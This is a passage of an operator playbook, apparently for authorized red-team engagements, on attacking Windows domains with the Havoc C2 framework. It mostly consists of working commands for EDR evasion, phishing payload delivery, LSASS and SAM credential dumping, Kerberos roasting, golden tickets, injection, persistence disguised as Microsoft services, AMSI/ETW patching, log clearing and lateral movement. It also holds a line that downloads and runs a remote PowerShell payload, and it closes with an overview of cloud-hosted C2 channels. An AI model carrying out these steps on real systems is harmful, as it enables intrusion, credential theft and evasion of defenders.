#### 2.2 Preferred Payload Format for Evasion

```
Raw shellcode output → embed in a custom loader rather than using the exe directly

Why: the exe has Havoc's PE structure and import table intact — AV/EDR vendors
have signatures for it. A raw shellcode blob injected via a custom loader (written
in C, Nim, Go, or Rust) gives you full control over how it lands in memory,
what process it runs in, and how it evades memory scanning.
```

#### 2.3 Key Evasion Features Built Into the Demon

```
Indirect Syscalls (HellsGate/HalosGate)
  — Nt* API calls (NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.) are
    routed through legitimate ntdll.dll stubs rather than called directly from
    the Demon's own memory region
  — Bypasses user-mode hooks that EDRs (CrowdStrike Falcon, SentinelOne, etc.)
    plant in ntdll to intercept API calls

Sleep Obfuscation (Ekko technique)
  — While the Demon sleeps between callbacks, it encrypts its own heap and stack
    with a timer-based APC queue, decrypts when waking to process a task
  — Makes memory-scanning-based detection ineffective during beacon intervals

x64 Return Address / Stack Spoofing
  — Spoofs the call stack visible to a debugger or ETW-based stack walker
  — Makes it appear the Demon's calls originate from a legitimate module rather
    than from the implant's own code region

BOF (Beacon Object File) Execution
  — Cobalt Strike-compatible BOFs run in-process within the Demon's own memory
  — No child process spawned, no tool dropped to disk
  — Primary execution method for any sensitive post-exploitation task
```

---

### PART 3 — Initial Access

#### 3.1 Phishing (if in scope per RoE)

```
HTML Smuggling (preferred — bypasses email gateway inspection):
  — JavaScript blob reconstructs and auto-downloads the payload on the victim's machine
  — Email body contains a benign-looking HTML attachment; the payload never transits
    the email gateway as a recognizable file type

ISO + LNK combo:
  — ISO file containing an LNK shortcut that executes the Demon payload
  — Files inside ISO containers don't inherit Mark-of-the-Web (MOTW) from the
    browser download, bypassing SmartScreen on Windows 10/11

OneNote .one file:
  — Embedded OLE object or button triggers the payload on click
  — Increasingly detected but still effective in certain environments

Delivery infrastructure checklist:
  - Phishing domain aged ≥30 days
  - Valid DMARC / DKIM / SPF configured
  - TLS on payload hosting domain
  - GoPhish for click/open tracking if in scope
```

#### 3.2 Assumed Breach (most common starting position for mature clients)

```
Client provides: a standard domain-joined workstation + low-privilege user credentials
Deploy the Demon payload on this workstation as the starting position
Engagement tests detection, lateral movement, and escalation capability from this baseline
```

---

### PART 4 — Post-Exploitation (Demon Commands)

Once a Demon checks in (visible in the Agents panel — double-click to open an interactive console), all commands below are entered in that console.

#### 4.1 Situational Awareness

```bash
# Basic identity and host context
whoami
whoami /priv                          # privilege check — look for SeImpersonatePrivilege, SeDebugPrivilege
hostname
ipconfig /all                          # also: shell ipconfig /all

# OS version and patch level
shell systeminfo

# Running processes (built-in, no cmd.exe spawned)
ps

# Current directory and listing
pwd
ls
ls C:\Users\

# File operations
cat C:\path\to\file.txt
download C:\path\to\file.txt          # pull to operator machine via teamserver
upload /local/path C:\remote\path      # push a file to the target

# Network connections (no netstat binary — built-in)
net

# List environment variables
env

# Screenshot (single capture of current desktop)
screenshot

# Keylogger
keylog start
keylog stop
keylog dump                            # retrieve captured keystrokes
```

#### 4.2 BOF Execution (preferred over shell for OPSEC)

BOFs run inside the Demon's own process memory — no child process, no disk artifact:

```bash
# Execute any compiled Beacon Object File
inline-execute /opt/bofs/objectfile.x64.o

# TrustedSec Situational Awareness BOF pack (drop-in replacements for common discovery commands)
inline-execute /opt/bofs/whoami.x64.o
inline-execute /opt/bofs/ipconfig.x64.o
inline-execute /opt/bofs/netstat.x64.o
inline-execute /opt/bofs/arp.x64.o
inline-execute /opt/bofs/ldapsearch.x64.o -- /str:"(objectCategory=computer)"

# AD enumeration without spawning net.exe/nltest
inline-execute /opt/bofs/netsession.x64.o
inline-execute /opt/bofs/netuser.x64.o
inline-execute /opt/bofs/netgroup.x64.o

# Kerberoasting via BOF (no Rubeus on disk)
inline-execute /opt/bofs/kerberoast.x64.o

# ADCS enumeration (certificate templates)
inline-execute /opt/bofs/adcs.x64.o

# Recommended BOF collections for Havoc:
# - TrustedSec CS-Situational-Awareness-BOF
# - outflanknl/InlineExecute-Assembly (for running .NET in-process)
# - boku7in/LdapSignCheck
```

#### 4.3 Shell and PowerShell (use sparingly — spawns a child process, flagged by behavioral EDR)

```bash
# cmd.exe child process (noisy — use BOF equivalents whenever possible)
shell whoami /all
shell net user /domain
shell net group "Domain Admins" /domain
shell nltest /domain_trusts

# PowerShell child process (even noisier — AMSI + ScriptBlock logging applies)
powershell Get-Process
powershell Get-ADUser -Filter * -Properties *
powershell Invoke-Kerberoast -OutputFormat Hashcat | Out-File C:\Windows\Temp\h.txt

# Execute a .NET assembly in-memory (no disk touch on the target for the assembly itself)
dotnet-exec /opt/tools/Seatbelt.exe -- -group=all
dotnet-exec /opt/tools/SharpHound.exe -- -c All --zipfilename bh.zip
dotnet-exec /opt/tools/Rubeus.exe -- kerberoast /format:hashcat
dotnet-exec /opt/tools/SharpUp.exe -- audit
```

#### 4.4 Credential Access

```bash
# LSASS credential dump (requires SeDebugPrivilege or SYSTEM)
# Via BOF (in-process — avoids spawning mimikatz.exe)
inline-execute /opt/bofs/nanodump.x64.o -- /full /path:C:\Windows\Temp\lsass.dmp
# then pull the dump and process offline with pypykatz/mimikatz locally

# Token vault — steal and store tokens from running processes
token steal <pid>             # steal token from a process running as another user
token list                     # list all tokens in the vault
token impersonate <token_id>   # impersonate a stored token for subsequent commands
token revert                    # revert to original token

# Token elevation (SeImpersonatePrivilege → SYSTEM)
token make_token <domain> <user> <password>    # create a token with explicit creds
# then use token impersonate for subsequent commands

# DPAPI decryption (browser passwords, WiFi keys, etc.)
inline-execute /opt/bofs/dpapi.x64.o -- /chrome

# SAM/SECURITY hive dump (local accounts)
inline-execute /opt/bofs/reg_save.x64.o -- /hive:sam /path:C:\Windows\Temp\sam.hive
inline-execute /opt/bofs/reg_save.x64.o -- /hive:security /path:C:\Windows\Temp\sec.hive
inline-execute /opt/bofs/reg_save.x64.o -- /hive:system /path:C:\Windows\Temp\sys.hive
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\sec.hive
download C:\Windows\Temp\sys.hive
# crack offline: impacket-secretsdump -sam sam.hive -security sec.hive -system sys.hive LOCAL
```

#### 4.5 Kerberos Attacks (built-in Kerberos module)

```bash
# Kerberoasting — request service tickets for offline cracking
kerberos roast

# AS-REP Roasting — for accounts with pre-auth disabled
kerberos asktgt /user:<username> /enctype:rc4

# Pass-the-Ticket — inject a base64 Kerberos ticket into the current session
kerberos ptt /ticket:<base64_ticket>

# List current Kerberos tickets
kerberos list

# Purge tickets
kerberos purge

# DCSync (requires Domain Admin or equivalent — pull hashes from DC replication)
# Use via dotnet-exec with Mimikatz or SharpKatz
dotnet-exec /opt/tools/SharpKatz.exe -- --Command dcsync --User krbtgt --Domain <domain>
```

#### 4.6 Process Injection

```bash
# Inject shellcode into a remote process (default: CreateRemoteThread technique)
inject shellcode <pid> /path/to/shellcode.bin

# Inject a DLL into a remote process
inject dll <pid> /path/to/payload.dll

# Spawn a sacrificial process and inject shellcode into it
# (Spawn64/Spawn32 process is set in the profile — WerFault.exe by default)
spawn shellcode /path/to/shellcode.bin
spawn dll /path/to/payload.dll

# Injection technique selection (override profile default)
inject shellcode <pid> /path/to/shellcode.bin --technique 1    # CreateRemoteThread
inject shellcode <pid> /path/to/shellcode.bin --technique 2    # NtMapViewOfSection
inject shellcode <pid> /path/to/shellcode.bin --technique 3    # APC queue injection
```

#### 4.7 Privilege Escalation

```bash
# Automated privesc checks via SharpUp BOF
dotnet-exec /opt/tools/SharpUp.exe -- audit

# Named pipe impersonation (SeImpersonatePrivilege → SYSTEM)
# GodPotato — upload and execute via Demon
upload /opt/tools/GodPotato.exe C:\Windows\Temp\gp.exe
shell C:\Windows\Temp\gp.exe -cmd "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://redirector/payload.ps1')"

# PrintSpoofer alternative
upload /opt/tools/PrintSpoofer.exe C:\Windows\Temp\ps.exe
shell C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\demon.exe"

# UAC bypass (various — select based on OS build)
dotnet-exec /opt/tools/UACME.exe -- <technique_number>

# Via BOF
inline-execute /opt/bofs/uacbypass.x64.o
```

#### 4.8 Persistence

```bash
# Scheduled task (survives reboot, runs as SYSTEM or specified user)
shell schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\Windows\Temp\demon.exe" /sc onlogon /ru SYSTEM /f

# Registry run key
shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "OneDriveSync" /t REG_SZ /d "C:\Windows\Temp\demon.exe" /f

# WMI event subscription (stealthiest — no schtasks or reg key visible)
inline-execute /opt/bofs/wmi_persistence.x64.o -- /name:Update /command:"C:\Windows\Temp\demon.exe" /interval:60

# Service-based persistence (noisiest — generates Event 7045)
shell sc create "WindowsDefenderSync" binpath= "C:\Windows\Temp\demon.exe" start= auto
shell sc start "WindowsDefenderSync"
```

#### 4.9 Defense Evasion

```bash
# Timestomping — modify file timestamps to match surrounding files
timestomp C:\Windows\Temp\demon.exe C:\Windows\System32\notepad.exe

# Configuration inspection at runtime
config --show                 # show current Demon sleep, jitter, and evasion settings
config --sleep 120             # change sleep interval on the fly
config --jitter 30             # change jitter percentage

# Process hollowing / PPID spoofing via custom loader
# (configure SpawnTo in the profile — WerFault.exe by default, appears as Windows Error Reporting)

# Patching AMSI and ETW in-process (reduces PowerShell detection)
# Via BOF — these run in the current process memory without touching disk
inline-execute /opt/bofs/amsi_patch.x64.o
inline-execute /opt/bofs/etw_patch.x64.o

# Event log clearing (only if explicitly authorized in RoE — highly disruptive, may alert)
shell wevtutil cl System
shell wevtutil cl Security
shell wevtutil cl Application
```

---

### PART 5 — Lateral Movement

#### 5.1 SMB Named-Pipe Lateral Movement (peer-to-peer, no direct internet required)

```bash
# Step 1: Generate an SMB listener in Havoc
# Havoc Client → Attack → Listener → Add → Type: SMB
# Name: smb-internal, Pipe Name: \\.\\pipe\\havoc_smb

# Step 2: Generate an SMB Demon payload for the target
# Attack → Payload → Listener: smb-internal → Format: Shellcode

# Step 3: Deploy the payload on the internal target (via any method: shell/WMI/DCOM)
upload /opt/payloads/demon_smb.bin C:\Windows\Temp\d.bin
# execute via: shell rundll32 shell32.dll,ShellExec_RunDLL C:\Windows\Temp\d.bin

# Step 4: Link from your current internet-connected Demon to the SMB Demon
pivot smb connect --host <target_ip> --pipe havoc_smb

# Step 5: Unlink when done
pivot smb disconnect <session_id>
```

#### 5.2 WMI Lateral Movement

```bash
# Execute a command on a remote host via WMI (requires credentials or valid token)
shell wmic /node:<target_ip> /user:<domain>\<user> /password:<pass> process call create "C:\Windows\Temp\demon.exe"

# Via dotnet-exec with SharpWMI (avoids shell child-process artifact)
dotnet-exec /opt/tools/SharpWMI.exe -- action=exec computername=<target> command="C:\Windows\Temp\demon.exe" username=<domain>\<user> password=<pass>
```

#### 5.3 DCOM Lateral Movement

```bash
dotnet-exec /opt/tools/SharpCOM.exe -- <target_ip> <payload_path>
```

#### 5.4 Pass-the-Hash / Pass-the-Ticket Lateral Movement

```bash
# Impersonate a token created with a stolen NTLM hash for lateral movement
token make_token <domain> <user> <nt_hash>     # note: Havoc accepts NT hash directly here
token impersonate 1                              # use the created token for subsequent commands
shell net use \\<target_ip>\C$ /user:<domain>\<user>
# then upload/execute payload on \\<target_ip>\C$\Windows\Temp\

# Pass-the-Ticket for lateral movement (after obtaining a TGT via Rubeus/kerberos module)
kerberos ptt /ticket:<base64_ticket>
# subsequent commands now run under the impersonated principal's Kerberos context
```

#### 5.5 SOCKS5 Proxy (pivot tool traffic through the Demon)

```bash
# Start a SOCKS5 proxy on the teamserver via the Demon
socks5 start <port>                 # e.g. socks5 start 1080

# Operators can then configure ProxyChains on their machine to route through the Demon:
# /etc/proxychains4.conf:
#   socks5 127.0.0.1 1080

# Example: run nmap against an internal subnet via the pivot
proxychains nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24

# Stop proxy when done
socks5 stop
```

---

### PART 6 — Active Directory Attacks

```bash
# BloodHound collection via SharpHound (map entire AD, find privilege escalation paths)
dotnet-exec /opt/tools/SharpHound.exe -- -c All --zipfilename bh.zip
download C:\Windows\Temp\bh.zip
# Import into BloodHound 4+ → right-click → "Find Shortest Paths to Domain Admins"

# LDAP enumeration via BOF
inline-execute /opt/bofs/ldapsearch.x64.o -- /str:"(&(objectCategory=person)(objectClass=user)(adminCount=1))"
inline-execute /opt/bofs/ldapsearch.x64.o -- /str:"(userAccountControl:1.2.840.113556.1.4.803:=524288)"     # unconstrained delegation
inline-execute /opt/bofs/ldapsearch.x64.o -- /str:"(msDS-AllowedToDelegateTo=*)"                            # constrained delegation

# Kerberoasting (no Rubeus on disk — Demon's built-in kerberos module)
kerberos roast

# AS-REP Roasting
kerberos asktgt /user:<user_without_preauth> /enctype:rc4

# ADCS abuse — ESC1/ESC4/ESC8 certificate template attacks
inline-execute /opt/bofs/adcs.x64.o            # enumerate vulnerable templates
dotnet-exec /opt/tools/Certify.exe -- find /vulnerable
dotnet-exec /opt/tools/Certify.exe -- request /ca:<CA> /template:<VulnTemplate> /altname:Administrator

# DCSync — replicate domain credential hashes (requires DA or specific replication rights)
dotnet-exec /opt/tools/SharpKatz.exe -- --Command dcsync --User krbtgt --Domain <domain> --DomainController <dc_hostname>

# Golden Ticket — forge a TGT using the krbtgt hash
dotnet-exec /opt/tools/SharpKatz.exe -- --Command golden --User Administrator --Domain <domain> --DomainSid <SID> --KrbtgtHash <krbtgt_ntlm>

# Silver Ticket — forge a service ticket for a specific host/service
dotnet-exec /opt/tools/SharpKatz.exe -- --Command silver --Service cifs --User Administrator --Domain <domain> --DomainSid <SID> --TargetService <target_host> --Rc4 <machine_account_hash>
```

---

### PART 7 — Exfiltration Simulation

```bash
# Simulate sensitive data exfiltration with a dummy file of equivalent size and type
shell echo "SIMULATED_PII_RECORD: SSN=123-45-6789, Name=John Doe" > C:\Windows\Temp\exfil_sim.csv
download C:\Windows\Temp\exfil_sim.csv

# Test whether DNS-based exfiltration is detected (DNS C2 channel simulation)
# Only if DNS C2 is configured in the Havoc profile and in scope per RoE

# Large file transfer test (checks if DLP alerts on volume)
shell fsutil file createnew C:\Windows\Temp\large_test.bin 10485760     # create a 10MB dummy
download C:\Windows\Temp\large_test.bin

# Document: what did we access, what could we have exfiltrated, when, over which channel
# This narrative goes into the engagement report's findings section
```

---

### PART 8 — Cleanup (Required at Engagement End)

```bash
# Remove all uploaded/created files on every compromised host
shell del C:\Windows\Temp\demon.exe /f /q
shell del C:\Windows\Temp\*.bin /f /q
shell del C:\Windows\Temp\*.exe /f /q
shell del C:\Windows\Temp\*.hive /f /q
shell del C:\Windows\Temp\*.zip /f /q
shell del C:\Windows\Temp\*.csv /f /q

# Remove scheduled tasks created during engagement
shell schtasks /delete /tn "MicrosoftEdgeUpdate" /f
shell schtasks /delete /tn "OneDriveSync" /f

# Remove registry run keys
shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "OneDriveSync" /f

# Remove services
shell sc delete "WindowsDefenderSync"

# Remove WMI subscriptions (if created)
shell powershell Get-WMIObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject

# Stop SOCKS proxy if running
socks5 stop

# Unlink all SMB pivots
pivot smb disconnect <session_id>

# Kill all Demon sessions cleanly from the Agents panel
# Right-click each agent → Exit → confirm

# Destroy/zero all captured credential files on operator machines
shred -u /opt/loot/*.dmp /opt/loot/*.hive /opt/loot/*.zip 2>/dev/null

# Document every artifact removed — this log goes in the final report appendix
```

---

### PART 9 — Reporting Structure

```
1. Executive Summary (1–2 pages, non-technical)
   - Engagement scope, dates, team
   - Highest-risk findings in plain language
   - Overall risk posture assessment
   - Top 3–5 prioritized strategic recommendations

2. Methodology
   - Phases: reconnaissance, initial access, post-exploitation, lateral movement, objective achievement
   - Tools used (Havoc version, all companion tools)
   - Testing windows strictly observed

3. Attack Narrative (chronological timeline)
   - Every significant action with exact timestamp
   - Commands run at each stage
   - Screenshots from the Havoc client console at key moments

4. Findings (one page minimum per finding)
   - Title
   - Severity (Critical/High/Medium/Low)
   - CVSS score
   - MITRE ATT&CK technique ID
   - Description: what the weakness is
   - Evidence: console output screenshot, captured hash (redacted to show impact without full exposure)
   - Impact: what a real attacker achieves from this finding
   - Recommendation: specific, actionable, prioritized

5. Objectives Summary
   - Which objectives achieved (Domain Admin, access to crown-jewel system, simulated exfil)
   - Which not achieved and why (detection/prevention control worked)

6. Appendices
   - Full Havoc operator log export (timestamped task history)
   - All redirector/C2 IP addresses and domains (for blue team blocklist)
   - Complete list of accounts, credentials, and systems accessed
   - Cleanup confirmation log with timestamps
```

---

### PART 10 — Havoc vs Mythic — Key Differences (know before choosing)

```
Havoc Demon (C + Assembly)          vs   Mythic Agents (Go, .NET, Swift, etc.)
  Indirect syscalls built-in              Agent-dependent (Apollo has it, others vary)
  Sleep obfuscation (Ekko) built-in       Agent-dependent
  Stack spoofing built-in                 Agent-dependent
  BOF-native execution model              Mythic uses its own task model (not BOF-native)
  Single agent focus (Demon only)         Multi-agent platform (many agents for many OS)
  Linux/Windows targets                   Linux/Windows/macOS coverage
  No official macOS agent                 Full macOS support via Hermes/Poseidon
  Free and open source                    Free and open source
  Lighter footprint                       Heavier platform, more operator UX features
```


---

## Tooling Checklist (Pre-Engagement)

```
Havoc C2 (teamserver + client)          — core C2 platform
Nginx/Apache redirector                   — OPSEC traffic redirection
Demon shellcode + custom loader            — primary payload delivery mechanism
TrustedSec CS-Situational-Awareness-BOF   — BOF replacements for discovery commands
nanodump BOF                               — LSASS dump without dropping mimikatz
SharpHound / BloodHound                     — AD attack-path mapping
Rubeus / kerberos module                    — Kerberos attacks
SharpUp / PowerUp                           — privesc enumeration
Certify + Certipy                           — ADCS certificate abuse
SharpKatz                                    — inline Mimikatz-equivalent for DCSync/golden ticket
GodPotato / PrintSpoofer                     — SeImpersonatePrivilege → SYSTEM
GoPhish (if phishing is in scope)             — phishing campaign management
proxychains4                                   — route tool traffic through SOCKS5 pivot
impacket suite                                  — offline credential processing
```

---

**Standing operational reminder:** Havoc's built-in operator log (visible in the teamserver's `logs/` directory and exportable from the client) is your legal and professional paper trail. Export it at engagement end and include it as a timestamped appendix in the final report — it maps every operator action to a specific time window, directly correlated against the authorized RoE testing schedule. If anything goes wrong or is disputed, this log is what demonstrates you stayed within scope.

---

**BONUS SECTION**

`if you have reached here i am giving you some additional c2 tools list here`

```
ICMP Tunneling -> ICMP protocol as tunnel
Github as C2 -> Dystopia
Gmail as C2 -> Gcat
Discord as C2 -> PyC2ord
Slack as C2 -> slackor
Twitter as C2 -> Twittor
normal website as c2 -> TrevorC2
telegram as C2 -> teleC2 
```

## **Here is another tools called graph strike**

**What GraphStrike Actually Is**

GraphStrike is a tool suite developed by Red Siege Information Security that enables Cobalt Strike's Beacon to use Microsoft Graph API for HTTPS C2 communications. All implant traffic routes through graph.microsoft.com, making it very difficult to identify as Beacon traffic because it uses legitimate methods to interact with Microsoft Cloud resources.

The core mechanism:

GraphStrike transmits all Beacon traffic via two files created in the attacker's SharePoint site. Rather than building a true External C2 (which requires developing and maintaining a custom implant), GraphStrike leverages an open-source User Defined Reflective Loader called AceLdr (adapted as GraphLdr) to hook the WinINet library calls that Beacon normally makes and redirect them through Graph API instead.

GraphStrike additionally incorporates call stack spoofing and GraphStrike does not create any paid assets in Azure, so no additional cost is incurred.

### Why It Was Built — The Problem It Solves

Most C2 frameworks do not support methods to fetch or rotate access tokens, which makes them unable to use Graph API. This can make it difficult for red teams to replicate APT techniques, and deprives defenders of a chance to observe and develop signatures for this kind of activity.

In other words — real APT groups were already doing this, red teams couldn't replicate it easily, and defenders had no exposure to it. GraphStrike closes that gap.

#### The Broader Category — Graph API as C2 Transport

GraphStrike is one tool in a whole family of techniques abusing Microsoft's own infrastructure as a C2 channel. Threat intelligence has been released regarding several different APTs already leveraging Microsoft Graph API for offensive campaigns: BLUELIGHT (APT37/ScarCruft), Graphite (APT28/Fancy Bear), Graphican (APT15/Nickel/The Flea), and SiestaGraph (unknown threat actor).

The technique has expanded well beyond Cobalt Strike. In 2024, a phishing campaign using the Havoc post-exploitation framework integrated SharePoint into its C2 workflow using Graph API as the transport mechanism — the attack started with an HTML phishing payload that redirected victims to a SharePoint-hosted PowerShell script. Once the Havoc Demon agent was deployed, it used Microsoft Graph API to communicate with the attacker-controlled SharePoint site, with all command-and-response traffic stored in SharePoint documents, encoded in AES-256 CTR mode and retrieved via Graph API file calls.

And most recently, Group-IB identified HOLLOWGRAPH, a new malware sample that uses the Microsoft Graph API through a compromised Microsoft 365 account to communicate with operators — using Microsoft 365 calendar events as the C2 channel, with DNS tunneling to refresh credentials. The malware supports just two commands, get and send, and executes both exclusively through trusted Microsoft cloud infrastructure.

#### Why This Category Is So Effective
```
graph.microsoft.com is:
  - A Microsoft-owned domain with a globally trusted TLS certificate
  - Present in virtually every corporate network's whitelist/allowlist
  - Encrypted (HTTPS) — no DPI can read the content
  - Expected — Microsoft 365 traffic generates constant legitimate Graph API calls
  - Free — a basic Microsoft account + SharePoint site costs nothing

From a defender's perspective:
  - You can't block graph.microsoft.com without breaking M365 for the entire org
  - You can't distinguish malicious Graph API calls from legitimate ones at the
    network layer without application-layer telemetry (Microsoft Defender for Cloud Apps,
    Purview, Entra sign-in logs)
  - The traffic volume from legitimate M365 usage drowns out C2 beacon callbacks
```
**The Full Ecosystem of "Living Off Trusted Sites" C2**
```
GraphStrike represents a broader technique category sometimes called LOTS (Living Off Trusted Sites) C2 — using high-reputation cloud infrastructure as the actual C2 transport:

GraphStrike          — Cobalt Strike Beacon via SharePoint/Graph API
Havoc + Graph API    — Havoc Demon via SharePoint/Graph API (2024 campaign)
HOLLOWGRAPH          — Calendar events as C2 channel via Graph API
C3 (F-Secure)        — Generic framework for building custom C2 over
                        cloud services (OneDrive, Slack, GitHub, etc.)
Sliver + GitHub      — Sliver implant using GitHub Gists as a dead-drop C2 channel
Cobalt Strike + Slack — Teams/Slack messages as C2 transport
PoshC2 + Dropbox     — Dropbox files as C2 channel
```
Where GraphStrike Fits in a Real Engagement
```
Engagement scenario: target has strict egress filtering and a mature SOC
                     that monitors outbound connections to unknown IPs/domains

Standard C2 (Havoc/Mythic/Sliver) problem:
  Even with a well-configured redirector and a legitimate-looking domain,
  the domain is newly registered, has no prior traffic history,
  and a skilled analyst will flag it

GraphStrike solution:
  All C2 traffic goes to graph.microsoft.com — a domain the organization
  itself already generates thousands of daily requests to
  No new domain to flag, no unknown IP to block, no traffic anomaly to detect
  The only detection path is behavioral: "why is this process making
  Graph API calls it has never made before" — which requires EDR + M365 Defender
  integration to correlate, not just network monitoring
```
**One-Line Summary**

GraphStrike is a Cobalt Strike plugin that tunnels all beacon C2 traffic through Microsoft's own Graph API and SharePoint infrastructure — making the implant's phone-home traffic indistinguishable from legitimate Microsoft 365 usage at the network layer, replicating a technique that multiple real APT groups were already using operationally before the tool existed.
